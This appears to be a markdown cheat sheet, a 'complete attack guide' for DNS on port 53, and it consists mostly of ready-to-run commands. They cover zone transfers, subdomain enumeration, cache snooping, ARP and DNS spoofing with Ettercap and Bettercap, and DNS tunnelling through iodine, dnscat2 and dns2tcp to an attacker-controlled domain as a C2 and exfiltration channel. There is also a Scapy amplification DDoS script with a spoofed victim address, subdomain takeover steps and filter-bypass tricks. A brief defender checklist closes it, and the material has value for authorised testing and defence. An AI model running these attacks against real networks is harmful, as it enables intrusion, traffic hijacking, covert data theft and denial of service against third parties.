# Port 53 - DNS (Domain Name System) - Complete Attack Guide

## 📖 Overview

**Protocol**: DNS (Domain Name System)
**Port**: 53 (TCP/UDP)
**Transport**: UDP (primary), TCP (zone transfers, large responses)
**Encryption**: Optional (DoH, DoT, DNSCrypt)
**Purpose**: Domain name resolution

## 🎯 Attack Objectives

- **Zone Transfer**: Extract complete DNS records
- **DNS Enumeration**: Discover subdomains and hosts
- **Cache Poisoning**: Redirect DNS queries
- **DNS Tunneling**: Data exfiltration/C2 channel
- **Subdomain Takeover**: Hijack abandoned subdomains
- **Information Gathering**: Map network infrastructure

## 🔍 Attack Methodology

### Phase 1: Discovery and Reconnaissance

**1.1 Detect DNS Service**
```bash
# Quick scan
nmap -p 53 192.168.1.100

# UDP and TCP
nmap -sU -sT -p 53 192.168.1.100

# Service version
nmap -p 53 -sV 192.168.1.100

# Comprehensive DNS scripts
nmap -p 53 --script dns-* 192.168.1.100
```

**1.2 Query DNS Server**
```bash
# Basic query
dig @192.168.1.100 target.com

# Query specific record types
dig @192.168.1.100 target.com A
dig @192.168.1.100 target.com MX
dig @192.168.1.100 target.com NS
dig @192.168.1.100 target.com TXT
dig @192.168.1.100 target.com SOA

# Using nslookup
nslookup target.com 192.168.1.100

# Using host
host target.com 192.168.1.100
host -t MX target.com 192.168.1.100
```

**1.3 DNS Server Fingerprinting**
```bash
# Identify DNS software
dig @192.168.1.100 version.bind CHAOS TXT
dig @192.168.1.100 version.server CHAOS TXT

# Nmap fingerprinting
nmap -p 53 --script dns-nsid 192.168.1.100

# Banner grabbing
nmap -p 53 --script banner 192.168.1.100
```

### Phase 2: Zone Transfer (AXFR)

**2.1 Attempt Zone Transfer**
```bash
# Using dig
dig @192.168.1.100 target.com AXFR

# Using host
host -l target.com 192.168.1.100

# Using nslookup
nslookup
> server 192.168.1.100
> set type=any
> ls -d target.com

# Nmap script
nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=target.com -p 53 192.168.1.100
```

**2.2 Automated Zone Transfer**
```bash
# Fierce
fierce --domain target.com --dns-servers 192.168.1.100

# DNSRecon
dnsrecon -d target.com -n 192.168.1.100 -t axfr

# DNSEnum
dnsenum --dnsserver 192.168.1.100 target.com
```

**2.3 Find Name Servers First**
```bash
# Get NS records
dig target.com NS

# Try each nameserver
for ns in $(dig +short target.com NS); do
  echo "Trying $ns"
  dig @$ns target.com AXFR
done
```

### Phase 3: DNS Enumeration

**3.1 Subdomain Enumeration**

**Using Fierce**:
```bash
fierce --domain target.com
fierce --domain target.com --subdomain-file subdomains.txt
```

**Using DNSRecon**:
```bash
# Standard enumeration
dnsrecon -d target.com

# Brute force
dnsrecon -d target.com -D subdomains.txt -t brt

# Reverse lookup
dnsrecon -r 192.168.1.0/24

# Google scraping
dnsrecon -d target.com -t goo
```

**Using Sublist3r**:
```bash
sublist3r -d target.com
sublist3r -d target.com -b  # Brute force
sublist3r -d target.com -e google,bing,yahoo
```

**Using Amass**:
```bash
# Passive enumeration
amass enum -passive -d target.com

# Active enumeration
amass enum -active -d target.com

# Brute force
amass enum -brute -d target.com -w wordlist.txt
```

**Using Gobuster**:
```bash
gobuster dns -d target.com -w subdomains.txt
gobuster dns -d target.com -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

**Using ffuf**:
```bash
ffuf -w subdomains.txt -u http://FUZZ.target.com -mc 200
```

**3.2 Reverse DNS Lookup**
```bash
# Single IP
dig -x 192.168.1.100

# Range scan
for ip in 192.168.1.{1..254}; do
  host $ip | grep "domain name pointer"
done

# Using DNSRecon
dnsrecon -r 192.168.1.0/24 -n 192.168.1.100

# Using Nmap
nmap -sL 192.168.1.0/24
```

**3.3 DNS Cache Snooping**
```bash
# Check if domain is cached (non-recursive query)
dig @192.168.1.100 target.com +norecurse

# Check specific domain
dig @192.168.1.100 gmail.com +norecurse

# If cached, returns answer quickly
# If not cached, returns no answer

# Nmap script
nmap -sU -p 53 --script dns-cache-snoop --script-args 'dns-cache-snoop.mode=timed,dns-cache-snoop.domains={gmail.com,facebook.com,bank.com}' 192.168.1.100
```

### Phase 4: DNS Cache Poisoning

**4.1 Kaminsky Attack**
```bash
# Requires vulnerable DNS server
# Send forged responses to poison cache

# Check if vulnerable
nmap -p 53 --script dns-random-txid 192.168.1.100

# Exploit (conceptual - use tools like Metasploit)
# Flood with queries and guess transaction ID
```

**4.2 Using Ettercap**
```bash
# DNS spoofing via MITM
echo "target.com A 192.168.1.200" >> /etc/ettercap/etter.dns

ettercap -T -i eth0 -M arp /// /// -P dns_spoof

# All requests for target.com redirected to 192.168.1.200
```

**4.3 Using Bettercap**
```bash
# Start Bettercap
bettercap -iface eth0

# In console:
set dns.spoof.domains target.com
set dns.spoof.address 192.168.1.200
dns.spoof on
arp.spoof on
```

### Phase 5: DNS Tunneling

**5.1 Using Iodine**
```bash
# Server setup (attacker controlled DNS)
iodined -f -c -P password 10.0.0.1 tunnel.attacker.com

# Client (victim network)
iodine -f -P password tunnel.attacker.com

# Creates tunnel interface, route traffic through DNS
```

**5.2 Using dns2tcp**
```bash
# Server
dns2tcpd -F -d 1 -f /etc/dns2tcpd.conf

# Client
dns2tcpc -r ssh -l 2222 -z tunnel.attacker.com
ssh -p 2222 127.0.0.1
```

**5.3 Using dnscat2**
```bash
# Server (attacker)
ruby dnscat2.rb tunnel.attacker.com

# Client (victim)
./dnscat tunnel.attacker.com

# Provides encrypted C2 channel over DNS
```

### Phase 6: Exploitation

**6.1 DNS Amplification (DDoS)**
```bash
# Send small query, get large response
# Spoof source IP to victim

# Using Scapy
from scapy.all import *

# Craft DNS query for ANY record (large response)
dns_query = IP(src="victim_ip", dst="open_resolver")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="target.com", qtype="ANY"))

send(dns_query, loop=1, verbose=0)

# Open resolver responds to victim with large answer
# Amplification factor: 50-100x
```

**6.2 Subdomain Takeover**
```bash
# Find dangling DNS records
dig target.com CNAME

# If CNAME points to unclaimed service:
# Example: blog.target.com -> old-site.s3.amazonaws.com

# Check if claimable
curl http://blog.target.com
# 404 or "NoSuchBucket"

# Claim the resource
# Create S3 bucket named "old-site"
# Upload content
# Now you control blog.target.com!

# Automated tools
subjack -w subdomains.txt -t 100 -timeout 30 -o results.txt -ssl
```

**6.3 DNS Rebinding**
```bash
# Bypass Same-Origin Policy

# Setup DNS with very short TTL
target.evil.com -> 1.2.3.4 (TTL: 1 second)

# JavaScript on attacker site queries target.evil.com
# DNS responds with public IP first
# Then changes to 127.0.0.1 or internal IP

# Allows access to localhost/internal services
```

## 🛡️ Bypass Techniques

### Bypassing DNS Filtering

**Technique 1: Alternative DNS Servers**
```bash
# Use Google DNS
dig @8.8.8.8 blocked-site.com

# Use Cloudflare
dig @1.1.1.1 blocked-site.com

# Use OpenDNS
dig @208.67.222.222 blocked-site.com
```

**Technique 2: DNS over HTTPS (DoH)**
```bash
# Using curl
curl -H 'accept: application/dns-json' 'https://cloudflare-dns.com/dns-query?name=target.com&type=A'

# Using Firefox/Chrome (built-in)
# Settings -> Network -> Enable DNS over HTTPS

# CLI tool
doggo target.com @https://dns.google/dns-query
```

**Technique 3: DNS over TLS (DoT)**
```bash
# Using kdig
kdig -d @1.1.1.1 +tls target.com

# Using stubby
stubby -C stubby.yml -l target.com
```

**Technique 4: DNS Tunneling** (See Phase 5)

### Bypassing Rate Limiting

```bash
# Slow down queries
for subdomain in $(cat subdomains.txt); do
  dig @192.168.1.100 $subdomain.target.com
  sleep 2
done

# Rotate DNS servers
for ns in $(dig +short target.com NS); do
  dig @$ns subdomain.target.com
done
```

## 📊 Information Extraction

**Critical DNS Records to Query**:
```bash
# A records - IP addresses
dig target.com A

# MX records - Mail servers
dig target.com MX

# NS records - Name servers
dig target.com NS

# TXT records - SPF, DKIM, verification
dig target.com TXT

# SOA - Zone authority info
dig target.com SOA

# SRV - Service records
dig _ldap._tcp.target.com SRV
dig _kerberos._tcp.target.com SRV

# CAA - Certificate authority
dig target.com CAA

# ANY - All records (if allowed)
dig target.com ANY
```

## 🔐 Security Recommendations

**For Defenders**:
1. **Restrict Zone Transfers** - Allow only trusted servers
2. **Disable Recursion** - For authoritative servers
3. **DNSSEC** - Sign DNS records
4. **Rate Limiting** - Prevent enumeration/DDoS
5. **Split-Horizon DNS** - Different views for internal/external
6. **Monitor Queries** - Detect tunneling/enumeration
7. **Update Software** - Patch DNS server regularly
8. **Hide Version** - Don't reveal BIND version
9. **Firewall Rules** - Restrict who can query
10. **DoH/DoT** - Encrypt DNS traffic

## ⚠️ Common Mistakes

**Attacker Mistakes**:
1. Not trying zone transfer first
2. Missing alternate name servers
3. Forgetting reverse DNS lookups
4. Ignoring TXT records (often contain valuable info)

**Defender Mistakes**:
1. Zone transfers allowed to any
2. Recursive queries from internet
3. No rate limiting - Easy enumeration
4. Revealing software version
5. No DNSSEC - Cache poisoning possible

## 🎯 Practical Attack Scenario

```bash
# Phase 1: Discovery
nmap -p 53 -sV 192.168.1.100
# Result: 53/tcp open domain ISC BIND 9.9.5

# Phase 2: Get NS records
dig target.com NS
# ns1.target.com, ns2.target.com

# Phase 3: Try zone transfer
dig @ns1.target.com target.com AXFR
# Success! Got full zone file

# Phase 4: Extract valuable info
# - 50+ subdomains found
# - dev.target.com (development server)
# - admin.target.com (admin panel)
# - vpn.target.com (VPN gateway)
# - db.target.com (database server)

# Phase 5: Target high-value assets
nmap -A dev.target.com
# Found open ports and services

# Phase 6: Check for subdomain takeover
dig dev.target.com CNAME
# Points to old-instance.herokuapp.com
# Claim it!
```

## 📚 Tools Summary

**Best Tool for Each Task**:
- **Zone Transfer**: dig, fierce, dnsrecon
- **Subdomain Enum**: Amass, Sublist3r, gobuster
- **Cache Poisoning**: Ettercap, Bettercap
- **DNS Tunneling**: iodine, dnscat2, dns2tcp
- **Subdomain Takeover**: subjack, can-i-take-over-xyz
- **Reconnaissance**: DNSRecon, fierce, dnsenum

## 🔗 Related Attacks

- **Port 80/443**: Web servers on discovered subdomains
- **Port 25**: Mail servers from MX records
- **Port 389**: LDAP from SRV records
- **Subdomain Takeover**: S3, Heroku, GitHub Pages

---

**Last Updated**: 2026-06-16
